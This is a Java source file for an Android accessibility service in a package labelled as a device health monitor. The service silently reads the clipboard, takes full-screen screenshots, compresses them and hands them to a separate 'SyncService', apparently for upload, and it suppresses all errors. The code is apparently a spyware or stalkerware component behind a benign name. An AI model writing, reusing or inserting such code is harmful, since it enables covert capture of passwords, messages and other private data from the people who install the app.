package com.device.health.monitor;

import android.accessibilityservice.AccessibilityService;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.Executors;

public class MonitorService extends AccessibilityService {

    private static volatile MonitorService instance;

    public static MonitorService getInstance() { return instance; }

    @Override protected void onServiceConnected() { instance = this; }
    @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
    @Override public void onInterrupt() {}
    @Override public void onDestroy() { instance = null; super.onDestroy(); }

    String getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData cd = cm != null ? cm.getPrimaryClip() : null;
            if (cd != null && cd.getItemCount() > 0) {
                CharSequence t = cd.getItemAt(0).coerceToText(this);
                return t != null ? t.toString() : null;
            }
        } catch (Exception ignored) {}
        return null;
    }

    void snap() {
        if (Build.VERSION.SDK_INT < 30) return;
        try {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                new TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult r) {
                        try {
                            Bitmap bmp = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), null);
                            if (bmp != null) {
                                ByteArrayOutputStream out = new ByteArrayOutputStream();
                                bmp.compress(Bitmap.CompressFormat.JPEG, 40, out);
                                SyncService.pendingShot = out.toByteArray();
                                bmp.recycle();
                            }
                            r.getHardwareBuffer().close();
                        } catch (Exception ignored) {}
                    }
                    @Override public void onFailure(int c) {}
                });
        } catch (Exception ignored) {}
    }
}
